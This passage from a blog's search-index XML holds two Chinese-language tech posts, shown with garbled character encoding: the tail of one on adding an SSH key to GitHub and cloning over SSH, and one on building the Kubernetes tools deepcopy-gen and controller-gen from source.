class="hljs-string">+----[SHA256]-----+</span><br><span class="hljs-string">[root@ubuntu-22 ~]#</span><br><span class="hljs-string">[root@ubuntu-22 ~]# cd .ssh</span><br><span class="hljs-string">[root@ubuntu-22 .ssh]# ll</span><br><span class="hljs-string">total 20</span><br><span class="hljs-string">drwx------ 2 root root 4096  1æœˆ 29 17:07 ./</span><br><span class="hljs-string">drwx------ 6 root root 4096  1æœˆ 29 17:06 ../</span><br><span class="hljs-string">-rw------- 1 root root 2602  1æœˆ 29 17:07 id_rsa</span><br><span class="hljs-string">-rw-r--r-- 1 root root  568  1æœˆ 29 17:07 id_rsa.pub</span><br><span class="hljs-string">-rw-r--r-- 1 root root  142  1æœˆ 29 17:06 known_hosts</span><br><span class="hljs-string">[root@ubuntu-22 .ssh]#</span><br><span class="hljs-string">[root@ubuntu-22 .ssh]# cat id_rsa.pub</span><br><span class="hljs-string">ssh-rsa ... root@ubuntu-22</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><p>github   è®¾ç½®    æŠŠè¿™ä¸ªå…¬é’¥æ”¾åˆ°githubçš„sshä¸­</p><p>è¿™ä¸‹é€šè¿‡git clone sshçš„æ–¹å¼å°±å¯ä»¥æˆåŠŸcloneä¸‹æ¥äº†</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 ~]<span class="hljs-comment"># git clone git@github.com:xxx/xxx.git</span><br>Cloning into <span class="hljs-string">&#x27;xxx&#x27;</span>...<br>remote: Enumerating objects: 3, <span class="hljs-keyword">done</span>.<br>remote: Counting objects: 100% (3/3), <span class="hljs-keyword">done</span>.<br>remote: Total 3 (delta 0), reused 0 (delta 0), pack-reused 0<br>Receiving objects: 100% (3/3), <span class="hljs-keyword">done</span>.<br><br></code></pre></td></tr></table></figure><p>git pushä¹Ÿå¯ä»¥äº†</p><p>å‚è€ƒï¼š<a href="https://blog.csdn.net/weixin_42072280/article/details/122540366?spm=1001.2014.3001.5501">githubè®¾ç½®æ·»åŠ SSH</a></p>]]></content>
    
    
    <categories>
      
      <category>git</category>
      
    </categories>
    
    
    <tags>
      
      <tag>git</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ã€goè¯­è¨€ç³»åˆ—ã€‘å®‰è£…k8sçš„controllerç›¸å…³ç»„ä»¶ï¼šdeepcopy-genå’Œcontroller-gen</title>
    <link href="/2022/05/22/go/%E3%80%90go%E8%AF%AD%E8%A8%80%E7%B3%BB%E5%88%97%E3%80%91%E5%AE%89%E8%A3%85k8s%E7%9A%84controller%E7%9B%B8%E5%85%B3%E7%BB%84%E4%BB%B6%EF%BC%9Adeepcopy-gen%E5%92%8Ccontroller-gen/"/>
    <url>/2022/05/22/go/%E3%80%90go%E8%AF%AD%E8%A8%80%E7%B3%BB%E5%88%97%E3%80%91%E5%AE%89%E8%A3%85k8s%E7%9A%84controller%E7%9B%B8%E5%85%B3%E7%BB%84%E4%BB%B6%EF%BC%9Adeepcopy-gen%E5%92%8Ccontroller-gen/</url>
    
    <content type="html"><![CDATA[<h2 id="deepcopy-gen"><a href="#deepcopy-gen" class="headerlink" title="deepcopy-gen"></a>deepcopy-gen</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">go get -u k8s.io/code-generator/...<br><span class="hljs-comment"># ä¸Šé¢å¦‚æœä¸æˆåŠŸï¼Œæ‰‹å·¥å®‰è£…å„ç§å·¥å…·</span><br>git <span class="hljs-built_in">clone</span> https://github.com/kubernetes/code-generator<br><span class="hljs-built_in">cd</span> code-generator<br>go build -o deepcopy-gen cmd/deepcopy-gen/main.go<br><span class="hljs-built_in">cp</span> deepcopy-gen ~/go_projects/bin/   <span class="hljs-comment"># æ”¾åˆ°/usr/local/binä¸‹ä¹Ÿå¯ä»¥</span><br></code></pre></td></tr></table></figure><p>å‚è€ƒï¼š <a href="https://www.cxyzjd.com/article/ch717828/106008698">https://www.cxyzjd.com/article/ch717828/106008698</a></p><h2 id="controller-gen"><a href="#controller-gen" class="headerlink" title="controller-gen"></a>controller-gen</h2><p>ä¸‹è½½åœ°å€ï¼š<a href="https://github.com/kubernetes-sigs/controller-tools/releases">https://github.com/kubernetes-sigs/controller-tools/releases</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># wget https://github.com/kubernetes-sigs/controller-tools/archive/refs/tags/v0.8.0.tar.gz</span><br><span class="hljs-comment"># tar -zxvf v0.8.0.tar.gz</span><br><span class="hljs-comment"># cd controller-tools-0.8.0</span><br><span class="hljs-comment"># go build -a -o controller-gen cmd/controller-gen/main.go</span><br><span class="hljs-comment"># mv controller-gen /usr/local/bin/</span><br><span class="hljs-comment"># controller-gen --version</span><br>Version: (devel)<br></code></pre></td></tr></table></figure><p>å‚è€ƒï¼š</p><p><a href="https://support.huaweicloud.com/devg-osc/osc_ss_0052.html">https://support.huaweicloud.com/devg-osc/osc_ss_0052.html</a></p>]]></content>
    
    
    <categories>
      
      <category>go</category>
      
    </categories>
    
    
    <tags>
      
      <tag>go</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
